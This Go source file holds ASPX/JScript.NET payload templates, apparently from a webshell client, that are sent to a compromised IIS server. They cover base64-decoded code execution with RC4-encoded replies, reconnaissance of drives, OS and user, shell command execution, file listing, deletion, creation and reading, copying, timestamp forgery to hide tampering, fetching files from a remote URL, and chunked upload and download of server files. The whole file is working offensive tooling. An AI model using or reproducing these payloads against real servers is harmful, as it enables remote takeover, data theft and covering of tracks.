package template


//执行脚本模版
var AspxTmp = `var random:String="%v";
var Result:String=random;
var err:Exception;
try{
    eval(System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String("%v")),"unsafe");
    }
catch(err){
    Result=Result+"ERROR:// "+err.message;
    }
Response.Write(System.Convert.ToBase64String(Rc4Base64Encode(Result,random)));
Response.End();`


//aspx获取基本信息模版
var AspxBaseinfo = `var c=System.IO.Directory.GetLogicalDrives();
var result = Server.MapPath(".")+"\n";
for(var i=0;i<=c.length-1;i++)
    result = result+c[i][0]+":";
result = result+"\n"+Environment.OSVersion+"\n"+Environment.UserName;
Result+=System.Convert.ToBase64String(System.Text.Encoding.GetEncoding("UTF-8").GetBytes(result));`

//命令执行模版，需要传输命令和使用的shell
var AspxTerminal = `var c=new System.Diagnostics.ProcessStartInfo(System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String("%v")));
var e=new System.Diagnostics.Process();
var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;
c.RedirectStandardOutput=true;
c.RedirectStandardError=true;
e.StartInfo=c;
c.Arguments="/c "+System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String("%v"));
var env = System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String(""));
if(env) {
    var envarr = env.split("|||asline|||");
    var i;
    for (var i in envarr) {
        var ss = envarr[i].split("|||askey|||");
        if (ss.length != 2) {
            continue;
            }
            c.EnvironmentVariables.Add(ss[0],ss[1]);
        }
    }
    e.Start();
    out=e.StandardOutput;
    EI=e.StandardError;
    e.Close();
    Result+=System.Convert.ToBase64String(System.Text.Encoding.GetEncoding("UTF-8").GetBytes(out.ReadToEnd() + EI.ReadToEnd()));`

//文件管理dir模版，需要传入目录
var AspxFileManagerDir = `var D=System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String("%v"))+"\\";
var m=new System.IO.DirectoryInfo(D);
var s=m.GetDirectories();
var re;
var P:String;
var i;
function T(p:String):String{
    return System.IO.File.GetLastWriteTime(p).ToString("yyyy-MM-dd HH:mm:ss");
}
for(i in s){
    P=D+s[i].Name;
    re=re+s[i].Name+"/\t"+T(P)+"\t0\t"+(s[i].Attributes)+"\n";
}
s=m.GetFiles();
for(i in s){
    P=D+s[i].Name;
    re=re+s[i].Name+"\t"+T(P)+"\t"+s[i].Length+"\t"+(s[i].Attributes)+"\n";
}
Result+=System.Convert.ToBase64String(System.Text.Encoding.GetEncoding("UTF-8").GetBytes(re));`


//文件管理删除文件模版，需要传入文件或目录,成功返回1
var AspxFileManagerDelete = `var P:String=System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String("%v"));
if(System.IO.Directory.Exists(P)){
    System.IO.Directory.Delete(P,true);
    }
else{
    System.IO.File.Delete(P);
    }
Result+=System.Convert.ToBase64String(System.Text.Encoding.GetEncoding("UTF-8").GetBytes("1"));`

//文件管理创建文件夹模版，需要传入要新建的绝对目录，成功返回1
var AspxFileManagerMkdir = `var D=System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String("%v"));
System.IO.Directory.CreateDirectory(D);
Result+=System.Convert.ToBase64String(System.Text.Encoding.GetEncoding("UTF-8").GetBytes("1"));`

//修改文件时间，需要传入文件名和时间格式"2021-03-10 07:16:42",成功返回1
var AspxFileManagerTime = `var DD=System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String("%v")),
    TM=System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String("%v"));
if(System.IO.Directory.Exists(DD)){
    System.IO.Directory.SetCreationTime(DD,TM);
    System.IO.Directory.SetLastWriteTime(DD,TM);
    System.IO.Directory.SetLastAccessTime(DD,TM);
    }
else{
    System.IO.File.SetCreationTime(DD,TM);
    System.IO.File.SetLastWriteTime(DD,TM);
    System.IO.File.SetLastAccessTime(DD,TM);
    }
Result+=System.Convert.ToBase64String(System.Text.Encoding.GetEncoding("UTF-8").GetBytes("1"));`

//文件重命名，需要传入该之前的文件名和改之后的文件名，成功返回1
var AspxFileManagerRename = `var src=System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String("%v")),
    dst=System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String("%v"));
    if (System.IO.Directory.Exists(src)){
        System.IO.Directory.Move(src,dst);
    }
    else{
    System.IO.File.Move(src,dst);
    }
Result+=System.Convert.ToBase64String(System.Text.Encoding.GetEncoding("UTF-8").GetBytes("1"));`

//复制文件，需要传入原文件或者目录名和目标文件和目录名，成功返回1
var AspxFileManagerCopyfile = `var S=System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String("%v"));
var D=System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String("%v"));
function cp(S:String,D:String){
    if(System.IO.Directory.Exists(S)){
        var m=new System.IO.DirectoryInfo(S);
        var i;
        var f=m.GetFiles();
        var d=m.GetDirectories();
        System.IO.Directory.CreateDirectory(D);
        for (i in f)System.IO.File.Copy(S+"\\"+f[i].Name,D+"\\"+f[i].Name);
        for (i in d)cp(S+"\\"+d[i].Name,D+"\\"+d[i].Name);
    }else{
        System.IO.File.Copy(S,D);
    }    
}
cp(S,D);
Result+=System.Convert.ToBase64String(System.Text.Encoding.GetEncoding("UTF-8").GetBytes("1"));`

//新建文件,需要传入两个参数，一个是文件名，一个是文件的内容
var AspxFileManagerCreateFile= `var P:String=System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String("%v"));
var m=new System.IO.StreamWriter(P,false,Encoding.Default);
m.Write(System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String("%v")));
m.Close();
Result+=System.Convert.ToBase64String(System.Text.Encoding.GetEncoding("UTF-8").GetBytes("1"));`

//查看文件，需要只需要传入要查看的文件名
var AspxFileManagerReadFile = `var P:String=System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String("%v"));
var m=new System.IO.StreamReader(P,Encoding.Default);
Result+=System.Convert.ToBase64String(System.Text.Encoding.GetEncoding("UTF-8").GetBytes(m.ReadToEnd()));
m.Close();`

//wget下载文件，需要传入要下载url和本地的完整文件名,和copy类似，只不过源文件变成url
var AspxFileManagerWgetFile = `var X=new ActiveXObject("Microsoft.XMLHTTP");
var S=new ActiveXObject("Adodb.Stream");
S.Type=1;
S.Mode=3;
S.Open();
X.Open("GET",System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String("%v")),false);
X.Send();
S.Write(X.ResponseBody);
S.Position=0;
S.SaveToFile(System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String("%v")),2);
S.close;
S=null;
X=null;
Result+=System.Convert.ToBase64String(System.Text.Encoding.GetEncoding("UTF-8").GetBytes("1"));`

// 下载文件模版，由于是一次读取所有文件内容到内存中，所以有文件长度限制128m，但是实际上不到128m
var AspxFileManagerDownLoad = `var dir= System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String("%v"));
var fs:System.IO.FileStream=new System.IO.FileStream(dir,System.IO.FileMode.Open);
var dataArray:byte[]= new byte[fs.Length];
var n:int = fs.Read(dataArray,0,fs.Length);
fs.Close();
Result+=System.Convert.ToBase64String(dataArray);`

//上传文件模版，分段上传，需要提供目标文件名，文件内容（base46编码的文件内容），php脚本中会把url数据解码追加到文件中
var AspxFileManagerUpload = `var P:String=System.Text.Encoding.GetEncoding("UTF-8").GetString(System.Convert.FromBase64String("%v"));
var Z:String=Request.Item["data"];
var B:byte[]=System.Convert.FromBase64String(Z)
var fs:System.IO.FileStream=new System.IO.FileStream(P,System.IO.FileMode.Append);
fs.Write(B,0,B.Length);
fs.Close();
Result+=System.Convert.ToBase64String(System.Text.Encoding.GetEncoding("UTF-8").GetBytes("1"));`
